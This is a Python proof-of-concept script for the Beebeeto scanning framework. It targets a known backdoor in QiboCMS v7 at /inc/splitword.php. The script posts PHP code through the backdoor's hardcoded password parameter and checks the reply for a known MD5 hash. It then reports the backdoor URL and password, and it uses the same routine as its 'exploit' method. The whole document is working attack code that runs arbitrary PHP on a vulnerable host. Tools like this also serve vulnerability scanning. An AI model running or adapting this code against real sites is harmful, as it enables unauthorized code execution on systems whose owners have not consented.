#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0135',
            'name': 'QiboCMS v7 /inc/splitword.php 后门漏洞 POC',
            'author': '1024',
            'create_date': '2014-11-03',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Qibocms',
            'vul_version': ['7'],
            'type': 'Other',
            'tag': ['Qibocms后门漏洞', '/inc/splitword.php', 'Y2hlbmdzaGlzLmMjd', 'php'],
            'desc': 'N/A',
            'references': ['http://www.wooyun.org/bugs/wooyun-2014-079582',
                           ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = '%s/inc/splitword.php' % args['options']['target']
        req = urllib2.Request(verify_url, data="Y2hlbmdzaGlzLmMjd=echo md5('beebeeto');")
        content = urllib2.urlopen(req).read()
        if '595bb9ce8726b4b55f538d3ca0ddfd76' in content:
            args['success'] = True
            args['poc_ret']['backdoor'] = verify_url
            args['poc_ret']['password'] = 'Y2hlbmdzaGlzLmMjd'
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())